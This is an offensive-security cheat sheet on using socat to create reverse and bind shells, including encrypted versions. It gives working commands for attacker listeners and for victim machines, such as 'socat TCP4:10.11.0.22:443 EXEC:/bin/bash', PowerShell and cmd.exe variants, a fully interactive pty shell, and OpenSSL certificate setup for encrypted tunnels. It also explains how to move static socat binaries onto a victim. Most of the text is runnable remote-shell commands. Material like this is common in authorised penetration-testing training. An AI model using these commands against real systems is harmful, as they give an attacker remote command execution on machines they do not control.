---
description: Creating reverse shells with Socat
---

# Socat

Socat provides an alternative to Netcat's ability to create bind and reverse shells.

Socat is unfortunately not often installed on machines by default, but static pre-compiled binaries can be downloaded from the [official releases page](https://github.com/3ndG4me/socat/releases) or some versions can be found [here](https://github.com/andrew-d/static-binaries/tree/master/binaries). If not already installed, one of these binaries can be downloaded and transferred to the victim machine (or downloaded directly to the machine).

## Basic Reverse Shell

The simplest reverse shell closely mimics the functionality and structure of Netcat.

### Attacking Machine

The command to start a socat reverse TCP shell is the same regardless of platform. On the attacker's machine the listener will be started with:

```
socat -d -d TCP4-LISTEN:443 STDOUT
```

<table><thead><tr><th width="220">Argument</th><th>Description</th></tr></thead><tbody><tr><td><code>-d -d</code></td><td>Increase verbosity (Optional)</td></tr><tr><td><code>TCP-LISTEN:{PORT}</code></td><td>Declare a listener at <code>{PORT}</code></td></tr><tr><td><code>STDOUT</code></td><td>Connect standard output (<code>STDOUT</code>) to the TCP socket</td></tr></tbody></table>

Run on a Windows machine the output would look like the following:

```powershell
C:\Users\offsec> socat -d -d TCP4-LISTEN:443 STDOUT
... socat[4388] N listening on AF=2 0.0.0.0:443
```

### Target Machine

The base of the command is the same on a Linux or Windows target:

```
socat TCP4:$IP:$PORT EXEC:
```

* `$IP` and `$PORT` may either be shell session variables or the values may be typed directly into the command
* What follows `EXEC:` is determined by the type of target

#### Linux Target

```bash
victim@linux:~$ socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```

<table><thead><tr><th width="213">Argument</th><th>Description</th></tr></thead><tbody><tr><td><code>TCP4:$IP:$PORT</code></td><td>Specify the location to reach out via <code>TCP4</code></td></tr><tr><td><code>EXEC:&#x3C;PATH></code></td><td>Specifies an executable to pipe socat into (<code>/bin/bash</code> in this case).<br><br>Similar to Netcat's <code>-e</code> flag</td></tr></tbody></table>

#### Windows Target:

<pre class="language-powershell"><code class="lang-powershell"><strong>C:\Users\victim> socat TCP:$IP:$PORT EXEC:powershell.exe,pipes
</strong></code></pre>

* `EXEC:` directs socat to run commands via PowerShell in this instance
* `pipes` option is used to force PowerShell (or `cmd.exe`) to use Unix style standard input and output

## Stabilization Techniques

### Fully Stable Shell (Linux Only)

Technique for creating a fully stable shell on Linux target system only (Attacking machine can be any operating system with socat installed).

#### Attacker Machine

The listener is started on the attacker's machine

```bash
socat TCP-L:$PORT FILE:`tty`,raw,echo=0
```

#### Target Machine

The target machine is prompted to reach out to the listener via the following command:

{% code overflow="wrap" %}
```bash
socat TCP4:$IP:$PORT EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```
{% endcode %}

<table><thead><tr><th width="200">Argument</th><th>Description</th></tr></thead><tbody><tr><td><code>EXEC:"bash -li"</code></td><td>Creates an interactive bash session (arguments and purpose listed below).<br><br><code>-li</code> flag launches an <em>interactive</em> shell in <em>login</em> invocation mode</td></tr><tr><td><code>pty</code></td><td>Allocates a pseudo-terminal on the target</td></tr><tr><td><code>stderr</code></td><td>Makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)</td></tr><tr><td><code>sigint</code></td><td>Passes any <code>Ctrl + C</code> commands through into the sub-process, allowing users to kill commands inside the shell</td></tr><tr><td><code>setsid</code></td><td>Creates the process in a new session</td></tr><tr><td><code>sane</code></td><td>Stabilizes the terminal, attempting to "normalize" it.</td></tr></tbody></table>

## Encrypted Shell

A shell session can be created with an SSL certificate to send the shell's traffic through an encrypted tunnel. First the certificate must be created, then the shell started. The commands are highlighted below, they are sourced from the walk-through found [here](https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/).&#x20;

### Certificate Creation

On the listening machine (attacker's for reverse shell, victim for bind shell), a certificate needs to be created prior to the creation of the shell

#### Linux Certificate Creation

On a Linux machine the certificate will be created via [OpenSSL](https://www.openssl.org/). The command to create a new certificate is as follows:

{% code overflow="wrap" %}
```bash
openssl req -newkey rsa:2048 -nodes -keyout cert.key -x509 -days 1000 -subj '/CN=www.mydom.com/O=My Company Name LTD./C=US' -out cert.crt
```
{% endcode %}

This will create the key file named `cert.key` and the certificate file named `cert.crt`. In order to use them with Socat they must be transformed into a `.pem` file which is done by concatenating the two files via the following command:

```bash
cat cert.key cert.crt > cert.pem
```

From here the `cert.pem` file can be used for the Socat shell.

### Bind Shell

[Cert generation](socat.md#certificate-creation) is the same for both reverse and bind shells. Once the cert has been created, in this case on the target machine, the shell can be started.

#### Linux Target Machine

The listener should be started on the target machine with the following command:

```bash
socat OPENSSL-LISTEN:$PORT,cert=cert.pem,verify=0,fork EXEC:/bin/bash
```

* The encrypted shell uses the `OPENSSL` protocol as opposed to `TCP4` as seen in unencrypted examples
* `verify=0` indicates that the certificate will not be checked/validated upon connection
* `fork` means that Socat will fork a child process before connecting to the port
* `$PORT` may be a shell session variable or simply written in (E.g. `OPENSSL-LISTEN:443`)

#### Windows Target Machine

The listener is started on a Windows machine with the following command:

```powershell
socat OPENSSL-LISTEN:$PORT,cert=cert.pem,verify=0,fork EXEC:'cmd.exe',pipes
```

* The command is broadly the same as the Linux one above save what follows `EXEC:`
* `cmd.exe` could be replaced with `powershell.exe` if desired/available (E.g. `EXEC:'powershell.exe',pipes`)
* `verify=0` indicates that the certificate will not be checked/validated upon connection
* `fork` means that Socat will fork a child process before connecting to the port
* `$PORT` may be a shell session variable or simply written in (E.g. `OPENSSL-LISTEN:443`)

#### Attacker Machine

The attacker can reach out to the listening bind shell with the command:

`socat - OPENSSL:$VictimIP:$PORT,verify=0`

* `$VictimIP` and `$PORT` may be shell session variables or simply written in (E.g. `OPENSSL:192.168.111.222:443`)
* `verify=0` indicates that the certificate will not be checked/validated upon connection

### Reverse Shell

[Cert generation](socat.md#certificate-creation) is the same for both reverse and bind shells. Once the cert has been created, in this case on the attacker's machine, the shell can be started.

#### Attacker Machine

The listener is started on the attacking machine as follows:

```bash
socat -d -d OPENSSL-LISTEN:$PORT,cert=cert.pem,verify=0,fork STDOUT
```

* `$PORT` may be a shell session variable or simply written in (E.g. `OPENSSL-LISTEN:443`)
* `verify=0` indicates that the certificate will not be checked/validated upon connection
* `fork` means that Socat will fork a child process before connecting to the port
* `STDOUT` is used to connect standard output to the socket

#### Linux Target Machine

When the victim machine is Linux, it is prompted to reach out to the listener via the following command:

```bash
socat OPENSSL:$AttackerIP:$Port,verify=0 EXEC:/bin/bash
```

* `verify=0` indicates that the certificate will not be checked/validated upon connection
* `$AttackerIP` and `$Port` may be shell session variables or simply written in (E.g. `OPENSSL:192.168.111.222:443`)
* `/bin/bash` can be changed to a different shell intepreter if desired

#### Windows Target Machine

The command to prompt a Windows target to reach out to the listener is broadly the same as the Linux one except what follows the `EXEC:` statement:

```powershell
socat OPENSSL:$AttackerIP:$Port,verify=0 EXEC:'cmd.exe',pipes
```

* `$AttackerIP` and `$Port` may be shell session variables or simply written in (E.g. `OPENSSL:192.168.111.222:443`)
* `cmd.exe` could be replaced with `powershell.exe` if desired/available (E.g. `EXEC:'powershell.exe',pipes`)
